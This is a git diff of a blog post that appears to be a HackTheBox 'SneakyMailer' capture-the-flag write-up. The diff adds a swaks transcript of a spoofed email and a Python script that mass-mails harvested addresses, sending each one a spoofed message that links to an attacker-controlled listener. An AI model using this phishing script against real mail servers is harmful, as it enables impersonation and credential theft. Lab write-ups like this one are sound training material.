@@ -1,5 +1,5 @@
 ---
-published: true
+published: false
 ---
 <img src="https://i.ibb.co/2tgV0yX/sneakymailer.png" alt="sneakymailer" border="0">
 
@@ -103,52 +103,65 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 <blockquote>  
 <p>Now save it all in a fill name it <code class="language-plaintext highlighter-rouge">emails</code></p>
 </blockquote>
-<h1>Phishing<h1>
+<h1>Phishing</h1>
 <blockquote>  
 <p>We need to sned spoofed emails to check what we can get, I used swaks</p>
 <p><a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a></p>
 </blockquote>  
-<img src="https://i.ibb.co/87nhc6p/dlw2ty.png" alt="dlw2ty" border="0">
+<pre>➜  sneakymailer swaks <span class="nt">--from</span> <span class="s2">"angelicaramos@sneakymailer.htb"</span> <span class="nt">--body</span> <span class="s2">"Test msg"</span> <span class="nt">--to</span> angelicaramos@sneakymailer.htb
+<span class="o">===</span> Trying sneakymailer.htb:25...
+<span class="o">===</span> Connected to sneakymailer.htb.
+&lt;-  220 debian ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
+ -&gt; EHLO m19o
+&lt;-  250-debian
+&lt;-  250-PIPELINING
+&lt;-  250-SIZE 10240000
+&lt;-  250-VRFY
+&lt;-  250-ETRN
+&lt;-  250-STARTTLS
+&lt;-  250-ENHANCEDSTATUSCODES
+&lt;-  250-8BITMIME
+&lt;-  250-DSN
+&lt;-  250-SMTPUTF8
+&lt;-  250 CHUNKING
+ -&gt; MAIL FROM:&lt;angelicaramos@sneakymailer.htb&gt;
+&lt;-  250 2.1.0 Ok
+ -&gt; RCPT TO:&lt;angelicaramos@sneakymailer.htb&gt;
+&lt;-  250 2.1.5 Ok
+ -&gt; DATA
+&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+ -&gt; Date: Wed, 15 Jul 2020 22:56:30 <span class="nt">-0400</span>
+ -&gt; To: angelicaramos@sneakymailer.htb
+ -&gt; From: angelicaramos@sneakymailer.htb
+ -&gt; Subject: <span class="nb">test </span>Wed, 15 Jul 2020 22:56:30 <span class="nt">-0400</span>
+ -&gt; Message-Id: &lt;20200715225630.013546@m19o&gt;
+ -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ -&gt; 
+ -&gt; Test msg
+ -&gt; 
+ -&gt; 
+ -&gt; <span class="nb">.</span>
+&lt;-  250 2.0.0 Ok: queued as F3049248C8
+ -&gt; QUIT
+&lt;-  221 2.0.0 Bye
+<span class="o">===</span> Connection closed with remote host.
+</pre>
 
 <h1>Phishing script</h1>
 
-<pre>➜  sneakymailer swaks --from "angelicaramos@sneakymailer.htb" --body "Test msg" --to angelicaramos@sneakymailer.htb
-=== Trying sneakymailer.htb:25...
-=== Connected to sneakymailer.htb.
- -  220 debian ESMTP Postfix (Debian/GNU)
- -  EHLO m190
- -  250-debian
- -  250-PIPELINING
- -  250-SIZE 10240000
- -  250-VRFY
- -  250-ETRN
- -  250-STARTTLS
- -  250-ENHANCEDSTATUSCODES
- -  250-8BITMIME
- -  250-DSN
- -  250-SMTPUTF8
- -  250 CHUNKING
- - MAIL FROM: angelicaramos@sneakymailer.htb
- -  250 2.1.0 Ok
- - RCPT TO: angelicaramos@sneakymailer.htb
- -  250 2.1.5 Ok
- - DATA
- -  354 End data with CR LF.CR LF
- - Date: Wed, 15 Jul 2020 22:56:30 -0400
- - To: angelicaramos@sneakymailer.htb
- - From: angelicaramos@sneakymailer.htb
- - Subject: test Wed, 15 Jul 2020 22:56:30 -0400
- - Message-Id: 20200715225630.013546@m19o
- - X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
- - 
- - Test msg
- - 
- - 
- - .
- -  250 2.0.0 Ok: queued as F3049248C8
- - QUIT
- -  221 2.0.0 Bye
-=== Connection closed with remote host.</pre>
+<pre><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">).</span><span class="n">readlines</span><span class="p">()]</span>
+<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s">"emails"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">emails</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[+]Sending email to "</span> <span class="o">+</span> <span class="n">emails</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="s">'swaks --from "angelicaramos@sneakymailer.htb" --body "http://10.10.14.24:8080" --to '</span> <span class="o">+</span> <span class="n">emails</span> <span class="o">+</span> <span class="s">" &gt; /dev/null"</span>
+        <span class="c1">#print command
+</span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</pre>
+
+  
  
   
   
